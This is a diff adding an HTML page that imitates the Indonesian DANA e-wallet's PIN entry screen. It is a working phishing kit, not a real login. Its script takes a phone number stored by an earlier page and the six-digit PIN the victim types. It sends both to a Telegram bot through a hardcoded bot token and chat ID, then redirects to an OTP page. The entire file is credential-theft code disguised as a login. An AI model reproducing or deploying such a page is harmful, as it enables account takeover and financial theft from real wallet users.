@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PIN Login</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    font-family:'Nunito',sans-serif;
+    background:#efefef;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    height:100vh;
+    margin:auto;
+    background:#efefef;
+    position:relative;
+}
+
+/* HEADER */
+.header{
+    width:100%;
+    height:58px;
+    background:#1296ea;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.back{
+    position:absolute;
+    left:18px;
+    top:24px;
+    width:10px;
+    height:10px;
+    border-left:2px solid #fff;
+    border-bottom:2px solid #fff;
+    transform:rotate(45deg);
+    border-radius:1px;
+    cursor:pointer;
+}
+
+.header-title{
+    color:#fff;
+    font-size:22px;
+    font-weight:700;
+    margin-top:2px;
+}
+
+/* CONTENT */
+.content{
+    padding-top:42px;
+    text-align:center;
+}
+
+.title{
+    font-size:20px;
+    color:#000;
+    font-weight:700;
+}
+
+/* PIN */
+.pin-box{
+    margin-top:48px;
+    display:flex;
+    justify-content:center;
+    gap:24px;
+}
+
+.dot{
+    width:14px;
+    height:14px;
+    border-radius:50%;
+    background:#cfcfcf;
+    transition:.2s;
+}
+
+.dot.active{
+    background:#1296ea;
+}
+
+.dot.success{
+    background:#21c063;
+    transform:scale(1.1);
+}
+
+/* FORGOT */
+.forgot{
+    margin-top:82px;
+    font-size:13px;
+    color:#1296ea;
+    font-weight:700;
+}
+
+/* INPUT */
+.pin-input{
+    position:absolute;
+    opacity:0;
+    pointer-events:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="back" onclick="history.back()"></div>
+        <div class="header-title">Masuk</div>
+    </div>
+
+    <div class="content">
+        <div class="title">Masukkan PIN</div>
+
+        <div class="pin-box">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <div class="forgot">LUPA PIN?</div>
+    </div>
+
+    <input 
+        type="password"
+        maxlength="6"
+        class="pin-input"
+        id="pinInput"
+        inputmode="numeric"
+    >
+
+</div>
+
+<script>
+// KONFIGURASI TELEGRAM
+const BOT_TOKEN = "7109004796:AAGU8FvieH2HkNADWvD5HMUAkXid_jb6_1w"; // Ganti Token Bot kamu
+const CHAT_ID = "5983910858"; // Ganti Chat ID kamu
+
+const input = document.getElementById('pinInput');
+const dots = document.querySelectorAll('.dot');
+
+// Ambil nomor HP yang disimpan dari halaman sebelumnya
+const nomorHpTersimpan = localStorage.getItem("nomor_hp") || "Tidak ada data";
+
+document.body.addEventListener('click', () => {
+    input.focus();
+});
+
+input.focus();
+
+// Fungsi kirim ke Telegram
+async function kirimKeTelegram(pin) {
+    const pesan = `🔐 Data PIN DANA\n📱 Nomor: ${nomorHpTersimpan}\n🔑 PIN: ${pin}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
+    await fetch(url);
+}
+
+input.addEventListener('input', function(){
+    // hanya angka
+    this.value = this.value.replace(/[^0-9]/g,'');
+
+    // reset tampilan
+    dots.forEach(dot => {
+        dot.classList.remove('active');
+        dot.classList.remove('success');
+    });
+
+    // aktifkan titik sesuai jumlah input
+    for(let i = 0; i < this.value.length; i++){
+        dots[i].classList.add('active');
+    }
+
+    // jika sudah 6 digit PIN
+    if(this.value.length === 6){
+
+        // animasi hijau
+        dots.forEach(dot => {
+            dot.classList.remove('active');
+            dot.classList.add('success');
+        });
+
+        // 1. Simpan PIN ke LocalStorage
+        localStorage.setItem("pin_dana", this.value);
+
+        // 2. Kirim data ke Telegram (tanpa waktu)
+        kirimKeTelegram(this.value);
+
+        // 3. Pindah ke halaman OTP
+        setTimeout(() => {
+            window.location.href = "otp.html";
+        }, 700);
+
+    }
+
+});
+</script>
+
+</body>
+</html>
